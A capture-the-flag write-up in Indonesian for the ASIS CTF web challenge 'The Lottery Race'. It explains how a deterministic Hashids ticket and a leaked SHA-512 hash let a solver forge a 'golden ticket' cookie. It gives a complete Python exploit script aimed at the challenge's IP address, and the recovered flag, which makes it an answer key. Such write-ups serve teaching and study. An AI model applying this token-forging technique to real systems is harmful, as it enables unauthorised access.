---
title: "The Lottery Race"
ctf: "ASIS CTF"
date: 2026-08-30
category: web
difficulty: medium
points: 0
flag_format: "ASIS{...}"
author: "nata"
---

# The Lottery Race

## Summary

Challenge ini kelihatannya mengarah ke race condition di endpoint `/lottery`, tapi payout maksimumnya tidak pernah cukup untuk mencapai wallet `31337`. Jalur yang benar adalah memanfaatkan source code yang dibocorkan di `/`, memahami bentuk tiket `Hashids`, lalu brute-force inti golden ticket dari hash SHA-512 yang dibocorkan oleh `/flag`.

## Solution

### Step 1: Baca source dan buang false lead race

Route `/` mengembalikan source code Flask. Dari sana terlihat:

- `/login` memberi cookie `ticket = generate_ticket(1337)`.
- `/lottery` memang bisa dirace, tapi total prize dibatasi `MAX_RACE = 5` dan `PRIZE_MAX = 9`.
- `/buy` butuh wallet `31337`, jadi race tidak akan pernah cukup.
- `/flag` tidak butuh session valid; endpoint ini hanya membandingkan cookie `ticket` dengan `generate_ticket(31337)`, dan jika gagal dia membocorkan `sha512(Golden Ticket)`.

Observasi pentingnya: `generate_ticket()` bersifat deterministik terhadap nilai wallet. Ticket untuk `1337` selalu sama, dan karena implementasinya cocok dengan `Hashids`, ticket `1337` dan `31337` punya padding yang sama karena:

```text
1337 % 100 == 31337 % 100 == 37
```

Pada `Hashids`, nilai ini menentukan `lottery` character yang mengendalikan shuffle internal untuk satu angka. Artinya sebagian besar ticket `31337` identik dengan ticket `1337`; yang berubah hanya inti pendek di tengah.

### Step 2: Brute-force inti golden ticket

Setelah membandingkan struktur ticket `1337` dengan perilaku `Hashids`, bentuk ticket `31337` bisa ditulis sebagai:

```text
ticket_31337 = ticket_1337[1:53] + core6 + ticket_1337[58:]
```

Jadi kita tidak perlu recover salt penuh. Cukup ambil hash SHA-512 dari `/flag`, lalu brute-force `core6`. Ruang carinya kecil: `44^3 * 4 = 340736` kandidat.

Script final:

```python
#!/usr/bin/env python3

import hashlib
import os
import re
import sys

import requests


BASE_TICKET_1337 = (
    "gonKBqlDdPr3Kg29oXObMZjNEm18pWG1lxAM9GBLJyK43DroYXZ27egV10dVpvqb"
    "Namw6OEjRPg8kznWv6zJnq7BlA4wkRaVyDYLxdNG6rVMy7"
)
ALPHABET = "12346789ABDEGJKLMNOPRVWXYZabdgjklmnopqrvwxyz"
GUARDS = "05Qe"


def fetch_target_hash(session: requests.Session, base_url: str) -> str:
    resp = session.get(f"{base_url}/flag", timeout=10)
    if resp.status_code not in (200, 403):
        resp.raise_for_status()
    match = re.search(r"sha512\\(Golden Ticket\\) = ([0-9a-f]{128})", resp.text)
    if not match:
        raise RuntimeError("golden ticket hash not found")
    return match.group(1)


def build_golden_ticket(target_hash: str) -> str:
    prefix = BASE_TICKET_1337[1:53]
    suffix = BASE_TICKET_1337[58:]
    for d1 in ALPHABET:
        for d2 in ALPHABET:
            for d3 in ALPHABET:
                for g2 in GUARDS:
                    ticket = prefix + "eg" + d1 + d2 + d3 + g2 + suffix
                    if hashlib.sha512(ticket.encode()).hexdigest() == target_hash:
                        return ticket
    raise RuntimeError("no matching ticket found")


def main() -> int:
    base_url = sys.argv[1] if len(sys.argv) > 1 else os.environ.get(
        "TARGET_URL", "http://91.107.150.87:33617"
    )
    session = requests.Session()
    target_hash = fetch_target_hash(session, base_url)
    ticket = build_golden_ticket(target_hash)
    resp = session.get(f"{base_url}/flag", cookies={"ticket": ticket}, timeout=10)
    resp.raise_for_status()
    print(resp.text)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
```

Script ini menghasilkan golden ticket:

```text
onKBqlDdPr3Kg29oXObMZjNEm18pWG1lxAM9GBLJyK43DroYXZ27egnZM0dVpvqbNamw6OEjRPg8kznWv6zJnq7BlA4wkRaVyDYLxdNG6rVMy7
```

Lalu request ke `/flag` mengembalikan:

```json
{"flag":"ASIS{h4shId5_!5_n0T_5aF3!!!!!}","ok":true}
```

## Flag

```text
ASIS{h4shId5_!5_n0T_5aF3!!!!!}
```
